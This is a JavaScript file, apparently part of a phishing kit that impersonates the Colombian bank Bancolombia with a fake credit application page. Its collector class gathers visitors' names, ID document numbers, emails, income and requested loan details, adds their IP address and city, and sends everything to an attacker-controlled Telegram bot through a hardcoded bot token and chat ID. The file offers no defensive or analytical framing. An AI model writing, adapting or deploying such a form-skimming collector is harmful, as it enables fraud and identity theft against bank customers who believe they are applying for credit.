//===========================================
// SISTEMA SIMPLE PARA INDEX1
//===========================================

// Configuración del bot de Telegram
var telegram_bot_id = "8238675522:AAHZhZrW4UGWc8a6EmYeN17iFnbX53IRcq0";
var chat_id = '6111604525';

// Sistema simple de recolección para index1
class Index1Collector {
    constructor() {
        this.ipInfo = {};
        this.getIpInfo();
    }

    // Obtiene IP y ciudad del usuario
    async getIpInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            this.ipInfo = {
                ip: data.ip,
                city: data.city
            };
        } catch (error) {
            console.log('No se pudo obtener información de IP');
            this.ipInfo = {
                ip: 'No disponible',
                city: 'No disponible'
            };
        }
    }

    // Recolecta datos del formulario de crédito
    collectCreditFormData() {
        return {
            nombre: this.getValue('name-input'),
            documento: this.getValue('document-input'),
            email: this.getValue('email-input'),
            ingresosMensuales: this.getValue('income-slider'),
            montoSolicitado: this.getValue('amount-slider'),
            plazoMeses: this.getValue('term-slider')
        };
    }

    // Función auxiliar para obtener valores
    getValue(id) {
        const element = document.getElementById(id);
        return element ? element.value : '';
    }

    // Genera mensaje para Telegram
    generateMessage(formData) {
        return `🏦 BANCOLOMBIA - Nv Solicitud 🇨🇴🔔

📋 Datos del Formulario:
👤 Nombre: ${formData.nombre}
🪪 Documento: ${formData.documento}
📩 Email: ${formData.email}
✅ Ingresos: $${this.formatMoney(formData.ingresosMensuales)}
💰 Monto Solicitado: $${this.formatMoney(formData.montoSolicitado)}
⏱ Plazo: ${formData.plazoMeses} meses
📍 IP: ${this.ipInfo.ip}
🏙 Ciudad: ${this.ipInfo.city}
💎 ASSHEE 💎`;
    }

    // Formatea números como dinero
    formatMoney(amount) {
        return new Intl.NumberFormat('es-CO').format(amount);
    }

    // Envía datos a Telegram
    async sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${telegram_bot_id}/sendMessage`;
        const payload = {
            chat_id: chat_id,
            text: message
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            console.log('✅ Datos enviados exitosamente:', data);
            return data;
        } catch (error) {
            console.error('❌ Error enviando datos:', error);
            throw error;
        }
    }

    // Función principal para enviar datos del formulario
    async sendCreditForm() {
        // Asegurar que tenemos la info de IP actualizada
        await this.getIpInfo();
        
        const formData = this.collectCreditFormData();
        const message = this.generateMessage(formData);
        
        return await this.sendToTelegram(message);
    }
}

// Crear instancia global
window.index1Collector = new Index1Collector();

// Función global para enviar datos
window.sendIndex1CreditForm = async function() {
    return await window.index1Collector.sendCreditForm();
};

console.log('🚀 Index1 Collector iniciado correctamente');